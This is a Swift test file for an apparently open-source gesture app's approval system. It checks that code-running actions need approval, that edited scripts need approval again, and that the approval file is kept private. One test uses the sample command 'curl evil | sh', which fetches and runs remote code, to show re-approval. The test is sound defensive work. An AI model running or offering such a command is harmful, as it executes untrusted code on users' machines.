// SPDX-License-Identifier: GPL-3.0-or-later

import Foundation
import Testing
import Model
@testable import Config

@Suite struct ActionApprovalTests {
    func binding(_ action: Action, enabled: Bool = true, id: UUID = UUID()) -> Binding {
        Binding(id: id, gesture: .tap(fingers: 3), action: action, enabled: enabled)
    }

    @Test func onlyCodeRunningActionsNeedApproval() {
        let needing: [Action] = [.shellScript("ls"), .appleScript("beep"), .shortcut(name: "x"), .openFile(path: "/a"), .openURL("https://a.b")]
        let others: [Action] = [.previousWindow, .nextWindow, .openApp(bundleID: "com.apple.Safari"), .systemKey(.mute),
                                .windowLayout(.maximize), .adjust(.volume), .mouseClick(.left), .cursorToNextDisplay]
        #expect(needing.allSatisfy(ActionApproval.requiresApproval))
        #expect(!others.contains(where: ActionApproval.requiresApproval))
    }

    @Test func defaultConfigAsksNothing() {
        #expect(ActionApproval.pending(Configuration.default.bindings, approved: []).isEmpty)
    }

    @Test func fingerprintFollowsTheActionContent() {
        #expect(ActionApproval.fingerprint(.shellScript("a")) == ActionApproval.fingerprint(.shellScript("a")))
        #expect(ActionApproval.fingerprint(.shellScript("a")) != ActionApproval.fingerprint(.shellScript("a ")))
        #expect(ActionApproval.fingerprint(.shellScript("a")) != ActionApproval.fingerprint(.appleScript("a")))
    }

    @Test func unapprovedIsPendingAndApprovedIsNot() {
        let b = binding(.shellScript("touch /tmp/x"))
        #expect(ActionApproval.pending([b], approved: []).map(\.id) == [b.id])
        #expect(ActionApproval.pending([b], approved: [ActionApproval.fingerprint(b.action)]).isEmpty)
    }

    @Test func aChangedScriptIsPendingAgain() {
        let approved: Set = [ActionApproval.fingerprint(.shellScript("touch /tmp/x"))]
        let changed = binding(.shellScript("curl evil | sh"))
        #expect(ActionApproval.pending([changed], approved: approved).count == 1)
    }

    @Test func disabledBindingsAreNeverPending() {
        #expect(ActionApproval.pending([binding(.shellScript("x"), enabled: false)], approved: []).isEmpty)
    }

    @Test func anInAppEditApprovesOnlyWhatItChanged() {
        let id = UUID()
        let untouched = binding(.shellScript("pending from outside"))
        let old = [untouched, binding(.shellScript("old"), id: id), binding(.previousWindow)]
        var new = old
        new[1].action = .shellScript("edited in the window")
        new.append(binding(.openURL("https://example.com")))
        let approved = ActionApproval.approvedByEdit(old: old, new: new)
        #expect(approved == [ActionApproval.fingerprint(.shellScript("edited in the window")), ActionApproval.fingerprint(.openURL("https://example.com"))])
    }

    @Test func enablingABindingInTheWindowApprovesIt() {
        let id = UUID()
        let old = [binding(.shellScript("x"), enabled: false, id: id)]
        var new = old
        new[0].enabled = true
        #expect(ActionApproval.approvedByEdit(old: old, new: new) == [ActionApproval.fingerprint(.shellScript("x"))])
    }
}

@Suite struct ApprovalStoreTests {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("og-approval-\(UUID().uuidString)")
    var url: URL { dir.appendingPathComponent("OpenGestures/approved.json") }

    @Test func missingFileMeansNothingApproved() {
        #expect(ApprovalStore(url: url).load().isEmpty)
    }

    @Test func roundTripsAndIsPrivate() throws {
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = ApprovalStore(url: url)
        try store.add(["b", "a"])
        try store.add(["c", "a"])
        #expect(store.load() == ["a", "b", "c"])
        func mode(_ u: URL) -> Int { (try? FileManager.default.attributesOfItem(atPath: u.path)[.posixPermissions] as? Int) ?? -1 }
        #expect(mode(url) == 0o600)
        #expect(mode(url.deletingLastPathComponent()) == 0o700)
    }

    @Test func corruptFileMeansNothingApprovedAndIsRepaired() throws {
        defer { try? FileManager.default.removeItem(at: dir) }
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data("not json".utf8).write(to: url)
        let store = ApprovalStore(url: url)
        #expect(store.load().isEmpty)
        try store.add(["a"])
        #expect(store.load() == ["a"])
    }
}
